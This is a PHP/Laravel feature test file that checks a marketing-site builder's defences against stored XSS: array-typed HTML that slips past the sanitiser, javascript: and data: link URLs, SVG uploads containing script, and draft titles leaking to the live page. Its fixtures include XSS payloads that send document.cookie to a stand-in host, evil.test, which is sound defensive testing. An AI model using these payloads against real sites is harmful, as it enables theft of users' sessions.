<?php

namespace Tests\Feature;

use App\Models\BlogPost;
use App\Models\PlatformUser;
use App\Models\SiteMedia;
use App\Models\SitePage;
use App\Models\SiteTheme;
use App\Support\DefaultSiteContent;
use App\Support\HtmlSanitizer;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Storage;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * STORED XSS ON THE PUBLIC MARKETING SITE — the defences, not the attacks.
 *
 * The public site and the customer app share an origin, so anything that
 * executes here executes with access to a signed-in customer's session. These
 * are the inverted forms of the audit's proof tests (AuditArea1SanitizerBypass,
 * SvgMediaXssProof): each one FAILED before the fix in this file's sibling
 * commits and passes after.
 *
 * Four holes are covered:
 *   1. TYPE CONFUSION past HtmlSanitizer::sanitizeBlocks — an ARRAY-valued
 *      `html` key skipped the sanitiser on the write pass AND the read pass,
 *      because the is_array() recursion ran before the `html` handling and the
 *      clean() call was gated on is_string(). React stringifies the array back
 *      into markup when it assigns it to .innerHTML.
 *   2. NO URL-SCHEME VALIDATION on nav / footer / social / block-CTA links.
 *      React 18 does not block `javascript:` hrefs.
 *   3. OPERATOR-UPLOADED SVG served inline as image/svg+xml from the app
 *      origin — a scriptable XML document that never touched the sanitiser.
 *   4. DRAFT LEAK — page title and SEO meta persisted on draft save, so an
 *      unpublished edit went live when the six-hour page cache expired.
 */
class SiteBuilderXssDefenceTest extends TestCase
{
    use RefreshDatabase;

    private function operator(string $email = 'op@platform.test'): PlatformUser
    {
        return PlatformUser::create([
            'name' => 'Operator',
            'email' => $email,
            'password' => 'operator-secret-pw',
            'role' => 'owner',
        ]);
    }

    // ---------------------------------------------------------------- 1. type confusion

    /**
     * Every JSON type an attacker can put under an `html` key. The sanitiser
     * must produce a STRING with no payload in it, whichever one arrives —
     * that is what makes the choice of type irrelevant.
     *
     * @return array<string, array{0:mixed}>
     */
    public static function hostileHtmlValues(): array
    {
        $payload = '<img src=x onerror=alert(document.domain)>';

        return [
            'list-wrapped' => [[$payload]],
            'nested list' => [[[$payload]]],
            'assoc-wrapped' => [['0' => $payload]],
            'multi element' => [['<b>hi</b>', $payload]],
            'object-ish' => [['type' => 'text', 'value' => $payload]],
            'boolean' => [true],
            'null' => [null],
        ];
    }

    #[DataProvider('hostileHtmlValues')]
    public function test_sanitize_blocks_cleans_an_html_key_whatever_its_type(mixed $value): void
    {
        $blocks = [[
            'id' => 'b1',
            'type' => 'rich_text',
            'data' => ['html' => $value],
        ]];

        $clean = HtmlSanitizer::sanitizeBlocks($blocks);

        $this->assertIsString(
            $clean[0]['data']['html'],
            'A non-string html value must be coerced, not passed through — React stringifies it into markup.'
        );
        $this->assertStringNotContainsString('onerror', $clean[0]['data']['html']);
        $this->assertStringNotContainsString('alert(', $clean[0]['data']['html']);
    }

    /** The array shape must not survive anywhere in the tree, however deep. */
    public function test_sanitize_blocks_cleans_html_nested_far_below_the_block_root(): void
    {
        $blocks = [[
            'id' => 'b1',
            'type' => 'faq',
            'data' => ['items' => [['q' => 'Why?', 'a' => ['html' => ['<script>alert(1)</script>']]]]],
        ]];

        $clean = HtmlSanitizer::sanitizeBlocks($blocks);

        $this->assertSame('', $clean[0]['data']['items'][0]['a']['html']);
    }

    /** The builder rejects the malformed block outright rather than normalising it silently. */
    public function test_the_save_path_rejects_a_non_string_html_value(): void
    {
        DefaultSiteContent::ensure();
        $page = SitePage::where('slug', 'home')->firstOrFail();
        $before = $page->blocks;

        $this->actingAs($this->operator(), 'platform')
            ->put(route('platform.site.save', $page), [
                'title' => 'Home',
                'blocks' => [[
                    'id' => 'b1',
                    'type' => 'rich_text',
                    'data' => ['html' => ['<img src=x onerror=fetch("https://evil.test/?c="+document.cookie)>']],
                ]],
            ])->assertSessionHasErrors('blocks.0.data.html');

        $this->assertSame($before, $page->fresh()->blocks, 'A rejected save must not have written anything.');
    }

    /**
     * READ-PASS defence. Rows written around the model — a pre-fix row, a
     * future import, a direct SQL edit — must still be cleaned before they are
     * served, because "we clean on save" protects nothing already stored.
     */
    public function test_an_array_wrapped_payload_written_straight_to_the_table_is_cleaned_on_render(): void
    {
        $blocks = [[
            'id' => 'b1',
            'type' => 'rich_text',
            'data' => ['html' => ['<p>Legit copy.</p><img src=x onerror=fetch("https://evil.test/?c="+document.cookie)>']],
        ]];

        DB::table('site_pages')->insert([
            'slug' => 'legacy-array-page',
            'title' => 'Legacy',
            'status' => 'published',
            'blocks' => json_encode($blocks),
            'published_blocks' => json_encode($blocks),
            'sort' => 98,
            'created_at' => now(),
            'updated_at' => now(),
        ]);

        $payload = SitePage::published('legacy-array-page')->publicPayload();

        $this->assertIsString($payload['blocks'][0]['data']['html']);
        $this->assertStringNotContainsString('onerror', $payload['blocks'][0]['data']['html']);
        $this->assertStringNotContainsString('evil.test', json_encode($payload));

        $response = $this->get('/legacy-array-page');
        $response->assertOk();
        $response->assertDontSee('onerror', false);
        $response->assertDontSee('evil.test', false);
    }

    /** Same class of bug on the blog body: the write pass must not be type-gated either. */
    public function test_blog_post_body_is_sanitised_whatever_type_is_assigned(): void
    {
        $post = BlogPost::create([
            'slug' => 'typed-body',
            'title' => 'Typed body',
            'status' => 'published',
            'published_at' => now()->subDay(),
            'body' => ['<script>alert(document.domain)</script>'],
        ]);

        $this->assertIsString($post->fresh()->body);
        $this->assertStringNotContainsString('alert(', (string) $post->fresh()->body);
        $this->assertStringNotContainsString('alert(', $post->fresh()->publicPayload()['body']);
    }

    // ---------------------------------------------------------------- 2. URL schemes

    /**
     * @return array<string, array{0:string}>
     */
    public static function hostileUrls(): array
    {
        return [
            'javascript' => ['javascript:fetch("https://evil.test/?c="+document.cookie)'],
            'javascript mixed case' => ['JaVaScRiPt:alert(1)'],
            'javascript padded' => ['  javascript:alert(1)'],
            'javascript entity' => ["java\tscript:alert(1)"],
            'vbscript' => ['vbscript:msgbox(1)'],
            'data html' => ['data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
            'protocol relative' => ['//evil.test/phish'],
            'backslash relative' => ['/\\evil.test/phish'],
        ];
    }

    #[DataProvider('hostileUrls')]
    public function test_block_cta_urls_are_scheme_checked(string $url): void
    {
        $blocks = [[
            'id' => 'b1',
            'type' => 'cta_band',
            'data' => ['heading' => 'Hi', 'primary_cta' => ['label' => 'Go', 'url' => $url]],
        ]];

        $clean = HtmlSanitizer::sanitizeBlocks($blocks);

        $this->assertNull($clean[0]['data']['primary_cta']['url']);
    }

    #[DataProvider('hostileUrls')]
    public function test_block_image_urls_are_scheme_checked(string $url): void
    {
        $clean = HtmlSanitizer::sanitizeBlocks([[
            'id' => 'b1',
            'type' => 'image',
            'data' => ['image_url' => $url, 'alt' => 'x'],
        ]]);

        $this->assertNull($clean[0]['data']['image_url']);
    }

    #[DataProvider('hostileUrls')]
    public function test_theme_nav_links_reject_unsafe_schemes(string $url): void
    {
        DefaultSiteContent::ensure();

        $this->actingAs($this->operator('nav@platform.test'), 'platform')
            ->put(route('platform.site.theme'), [
                'nav_links' => [['label' => 'Pricing', 'url' => $url]],
                'footer_columns' => [],
                'social_links' => [],
            ])->assertSessionHasErrors('nav_links.0.url');

        $this->assertStringNotContainsString(
            'evil.test',
            json_encode(SiteTheme::current()->fresh()->publicPayload())
        );
    }

    public function test_theme_footer_and_social_links_reject_unsafe_schemes(): void
    {
        DefaultSiteContent::ensure();

        $this->actingAs($this->operator('foot@platform.test'), 'platform')
            ->put(route('platform.site.theme'), [
                'nav_links' => [],
                'footer_columns' => [[
                    'title' => 'Product',
                    'links' => [['label' => 'Pricing', 'url' => 'javascript:alert(1)']],
                ]],
                'social_links' => ['x' => 'javascript:alert(2)'],
            ])
            ->assertSessionHasErrors(['footer_columns.0.links.0.url', 'social_links.x']);

        $this->assertStringNotContainsString(
            'javascript:',
            json_encode(SiteTheme::current()->fresh()->publicPayload())
        );
    }

    /**
     * Rules name the shapes the builder UI produces; the recursive scrub behind
     * them catches whatever else is posted. A nesting the rules do not describe
     * must still not be able to store a `javascript:` href.
     */
    public function test_a_nav_link_nested_below_the_validated_shape_is_still_scrubbed(): void
    {
        DefaultSiteContent::ensure();

        $this->actingAs($this->operator('deep@platform.test'), 'platform')
            ->put(route('platform.site.theme'), [
                'nav_links' => [[
                    'label' => 'More',
                    'groups' => [['items' => [['label' => 'Deep', 'url' => 'javascript:alert(1)']]]],
                ]],
                'footer_columns' => [],
                'social_links' => [],
            ])->assertRedirect();

        $this->assertStringNotContainsString(
            'javascript:',
            json_encode(SiteTheme::current()->fresh()->publicPayload())
        );
    }

    /** …and the legitimate link shapes the live site depends on are untouched. */
    public function test_legitimate_links_are_preserved(): void
    {
        DefaultSiteContent::ensure();

        $this->actingAs($this->operator('ok@platform.test'), 'platform')
            ->put(route('platform.site.theme'), [
                'nav_links' => [
                    ['label' => 'Pricing', 'url' => '/pricing'],
                    ['label' => 'Docs', 'url' => 'https://docs.staffvora.com'],
                    ['label' => 'Anchor', 'url' => '#features'],
                    ['label' => 'Blank', 'url' => ''],
                ],
                'footer_columns' => [['title' => 'Legal', 'links' => [['label' => 'Terms', 'url' => '/terms']]]],
                'social_links' => ['x' => 'https://x.com/staffvora', 'linkedin' => ''],
            ])->assertRedirect()->assertSessionHasNoErrors();

        $payload = SiteTheme::current()->fresh()->publicPayload();

        $this->assertSame('/pricing', $payload['nav_links'][0]['url']);
        $this->assertSame('https://docs.staffvora.com', $payload['nav_links'][1]['url']);
        $this->assertSame('#features', $payload['nav_links'][2]['url']);
        $this->assertSame('/terms', $payload['footer_columns'][0]['links'][0]['url']);
        $this->assertSame('https://x.com/staffvora', $payload['social_links']['x']);
        $this->assertSame('', $payload['social_links']['linkedin']);
    }

    /**
     * The link rules are wildcard rules, and a wildcard child rule makes
     * Validator::validated() drop its PARENT key — so the theme save now reads
     * the request directly. This is the regression guard for that: every
     * non-link field the operator can edit must still be persisted.
     */
    public function test_the_rest_of_the_theme_still_saves(): void
    {
        DefaultSiteContent::ensure();

        $this->actingAs($this->operator('theme@platform.test'), 'platform')
            ->put(route('platform.site.theme'), [
                'site_name' => 'Staffvora HQ',
                'tagline' => 'Time tracking that people accept',
                'accent_color' => '#123456',
                'highlight_color' => '#abcdef',
                'palette_preset' => 'ocean',
                'palette' => ['light' => ['surface' => '#ffffff', 'bogus' => 'not-a-hex'], 'dark' => []],
                'font' => 'Hanken Grotesk',
                'nav_links' => [['label' => 'Pricing', 'url' => '/pricing']],
                'footer_columns' => [],
                'social_links' => [],
                'contact_email' => 'hello@staffvora.com',
                'contact_phone' => '+441234567890',
                'contact_address' => '1 Example Street',
            ])->assertRedirect()->assertSessionHasNoErrors();

        $theme = SiteTheme::current()->fresh();

        $this->assertSame('Staffvora HQ', $theme->site_name);
        $this->assertSame('Time tracking that people accept', $theme->tagline);
        $this->assertSame('#123456', $theme->accent_color);
        $this->assertSame('#abcdef', $theme->highlight_color);
        $this->assertSame('ocean', $theme->palette_preset);
        $this->assertSame(['light' => ['surface' => '#ffffff']], $theme->palette);
        $this->assertSame('Hanken Grotesk', $theme->font);
        $this->assertSame('hello@staffvora.com', $theme->contact_email);
        $this->assertSame('+441234567890', $theme->contact_phone);
        $this->assertSame('1 Example Street', $theme->contact_address);
        $this->assertSame([['label' => 'Pricing', 'url' => '/pricing']], $theme->nav_links);
    }

    /** Same guard for the page save, whose `blocks` key has the same wildcard shape. */
    public function test_a_normal_draft_save_still_stores_the_blocks(): void
    {
        DefaultSiteContent::ensure();
        $page = SitePage::where('slug', 'home')->firstOrFail();

        $this->actingAs($this->operator('blocks@platform.test'), 'platform')
            ->put(route('platform.site.save', $page), [
                'title' => 'Home',
                'blocks' => [[
                    'id' => 'b1',
                    'type' => 'rich_text',
                    'data' => ['html' => '<h2>Fine</h2><p>Copy.</p>'],
                ]],
            ])->assertRedirect()->assertSessionHasNoErrors();

        $stored = $page->fresh()->blocks;

        $this->assertCount(1, $stored);
        $this->assertSame('<h2>Fine</h2><p>Copy.</p>', $stored[0]['data']['html']);
    }

    /** mailto:/tel: links inside rich text keep working — the legal pages use them. */
    public function test_mailto_and_tel_links_still_survive_the_sanitiser(): void
    {
        $html = '<p>Write to <a href="mailto:hello@staffvora.com">us</a> or call <a href="tel:+441234567890">us</a>.</p>';

        $this->assertSame($html, HtmlSanitizer::clean($html));
    }

    // ---------------------------------------------------------------- 3. SVG uploads

    public function test_the_builder_refuses_an_svg_image_upload(): void
    {
        Storage::fake('avatars');

        $this->actingAs($this->operator('svg@platform.test'), 'platform')
            ->post(route('platform.site.image'), ['image' => $this->svgFile('payload.svg')])
            ->assertSessionHasErrors('image');

        $this->assertSame(0, SiteMedia::count(), 'No media row may be created for a rejected upload.');
    }

    public function test_the_builder_refuses_an_svg_logo_upload(): void
    {
        Storage::fake('avatars');

        $this->actingAs($this->operator('svglogo@platform.test'), 'platform')
            ->post(route('platform.site.logo'), ['logo' => $this->svgFile('logo.svg')])
            ->assertSessionHasErrors('logo');

        $this->assertNull(SiteTheme::current()->fresh()->logo_path);
    }

    /** A raster upload — the supported case — must keep working exactly as before. */
    public function test_png_uploads_still_work(): void
    {
        Storage::fake('avatars');

        $response = $this->actingAs($this->operator('png@platform.test'), 'platform')
            ->post(route('platform.site.image'), ['image' => UploadedFile::fake()->image('shot.png', 40, 40)]);

        $response->assertOk();
        $this->assertNotNull($response->json('url'));
        $this->assertSame(1, SiteMedia::count());
    }

    private function svgFile(string $name): UploadedFile
    {
        $svg = '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">'
            .'<script>fetch("https://evil.test/?"+document.cookie)</script></svg>';

        $tmp = tempnam(sys_get_temp_dir(), 'svg').'.svg';
        file_put_contents($tmp, $svg);

        return new UploadedFile($tmp, $name, 'image/svg+xml', null, true);
    }

    // ---------------------------------------------------------------- 4. draft leak

    public function test_saving_a_draft_does_not_change_what_the_public_page_shows(): void
    {
        DefaultSiteContent::ensure();
        $page = SitePage::where('slug', 'home')->firstOrFail();
        $page->publish();

        $liveTitle = $page->fresh()->title;
        $liveDescription = $page->fresh()->meta_description;

        $this->actingAs($this->operator('draft@platform.test'), 'platform')
            ->put(route('platform.site.save', $page), [
                'title' => 'Unfinished rewrite',
                'meta_title' => 'Unfinished SEO title',
                'meta_description' => 'Half-written description nobody approved.',
                'blocks' => $page->blocks,
            ])->assertRedirect()->assertSessionHasNoErrors();

        $fresh = $page->fresh();

        $this->assertSame($liveTitle, $fresh->title);
        $this->assertSame($liveDescription, $fresh->meta_description);
        $this->assertStringNotContainsString('Half-written', json_encode($fresh->publicPayload()));

        // The builder still shows the operator their unsaved-to-live work.
        $this->assertSame('Unfinished rewrite', $fresh->draft_title);
    }

    public function test_publishing_promotes_the_draft_title_and_seo_fields(): void
    {
        DefaultSiteContent::ensure();
        $page = SitePage::where('slug', 'home')->firstOrFail();

        $operator = $this->operator('pub@platform.test');

        $this->actingAs($operator, 'platform')
            ->put(route('platform.site.save', $page), [
                'title' => 'Approved title',
                'meta_title' => 'Approved SEO title',
                'meta_description' => 'Approved description.',
                'blocks' => $page->blocks,
            ])->assertRedirect();

        $this->actingAs($operator, 'platform')
            ->post(route('platform.site.publish', $page))->assertRedirect();

        $fresh = $page->fresh();

        $this->assertSame('Approved title', $fresh->title);
        $this->assertSame('Approved SEO title', $fresh->publicPayload()['meta']['title']);
        $this->assertSame('Approved description.', $fresh->publicPayload()['meta']['description']);
    }

    public function test_the_editor_is_handed_the_draft_values_not_the_live_ones(): void
    {
        DefaultSiteContent::ensure();
        $page = SitePage::where('slug', 'home')->firstOrFail();
        $operator = $this->operator('editor@platform.test');

        $this->actingAs($operator, 'platform')
            ->put(route('platform.site.save', $page), [
                'title' => 'Draft only title',
                'meta_description' => 'Draft only description.',
                'blocks' => $page->blocks,
            ])->assertRedirect();

        $this->actingAs($operator, 'platform')
            ->get(route('platform.site.edit', $page))
            ->assertOk()
            ->assertInertia(fn ($p) => $p
                ->where('page.title', 'Draft only title')
                ->where('page.meta_description', 'Draft only description.')
                ->etc()
            );
    }
}
